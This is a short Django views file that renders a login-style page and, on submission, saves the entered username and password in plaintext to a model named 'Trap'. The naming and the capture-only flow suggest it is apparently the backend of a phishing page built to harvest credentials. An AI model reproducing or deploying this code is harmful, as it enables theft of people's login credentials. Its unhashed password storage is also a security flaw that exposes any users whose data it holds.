from django.http import request
from django.shortcuts import render
from lock.models import Trap

# Create your views here.
def index(request):
    return render(request, "index.html")

def enter(request):
    if request.method == "POST":
        username = request.POST.get("username")
        password = request.POST.get("password")
        trap = Trap(username=username , password=password )
        trap.save()
        return render(request, "enter.html")
    return render(request, "index.html")